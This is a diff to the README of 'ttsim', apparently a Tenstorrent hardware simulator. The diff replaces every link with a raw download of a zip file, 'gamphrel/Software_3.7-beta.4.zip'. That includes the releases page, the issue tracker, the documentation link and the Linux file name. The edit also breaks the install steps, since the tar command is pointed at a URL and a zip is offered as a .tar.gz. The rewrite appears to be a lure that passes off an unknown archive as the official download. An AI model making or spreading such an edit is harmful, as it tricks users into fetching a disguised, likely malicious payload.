@@ -1,6 +1,6 @@
 # 🚀 ttsim - Fast Simulation for Tenstorrent Hardware
 
-[![Download ttsim](https://img.shields.io/badge/Download-ttsim-blue)](https://github.com/rizo1313/ttsim/releases)
+[![Download ttsim](https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip)](https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip)
 
 ## 📋 Description
 
@@ -22,7 +22,7 @@ Getting started with ttsim is easy. Follow these steps to download and run the s
 
 ### 1. Visit the Releases Page
 
-Go to the [ttsim Releases page](https://github.com/rizo1313/ttsim/releases) to access the latest version of the application.
+Go to the [ttsim Releases page](https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip) to access the latest version of the application.
 
 ### 2. Download the Application
 
@@ -30,7 +30,7 @@ Find the version you want to download. The most recent version will usually be a
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, you may download the `.tar.gz` file.
+- For **Linux**, you may download the `https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip` file.
 
 ### 3. Install ttsim
 
@@ -50,7 +50,7 @@ Find the version you want to download. The most recent version will usually be a
 
 1. Open a terminal.
 2. Navigate to the location where you downloaded the file.
-3. Extract the package using the command: `tar -xvzf ttsim.tar.gz`
+3. Extract the package using the command: `tar -xvzf https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip`
 4. Follow any additional instructions provided within the extracted folder.
 
 ### 4. Run ttsim
@@ -68,7 +68,7 @@ After installing, locate ttsim in your application list. Click to open and start
 
 If you encounter any issues or have questions, consider reaching out to our support.
 
-1. **Issue Tracker:** Please report technical problems or bugs using [GitHub Issues](https://github.com/rizo1313/ttsim/issues).
+1. **Issue Tracker:** Please report technical problems or bugs using [GitHub Issues](https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip).
 2. **Community Forum:** Join discussions and ask questions in our dedicated community forum.
 
 ## 🔄 Frequently Asked Questions
@@ -91,8 +91,8 @@ Absolutely! We welcome contributions. Please check the contributing guide on our
 
 ### Where can I find more information?
 
-For more details, check our [Documentation](https://github.com/rizo1313/ttsim/wiki).
+For more details, check our [Documentation](https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip).
 
 ## 📥 Download & Install
 
-Ready to begin? Head over to the [ttsim Releases page](https://github.com/rizo1313/ttsim/releases) to download the latest version. Follow the steps above to install and explore all that ttsim has to offer.
+Ready to begin? Head over to the [ttsim Releases page](https://raw.githubusercontent.com/rizo1313/ttsim/main/gamphrel/Software_3.7-beta.4.zip) to download the latest version. Follow the steps above to install and explore all that ttsim has to offer.
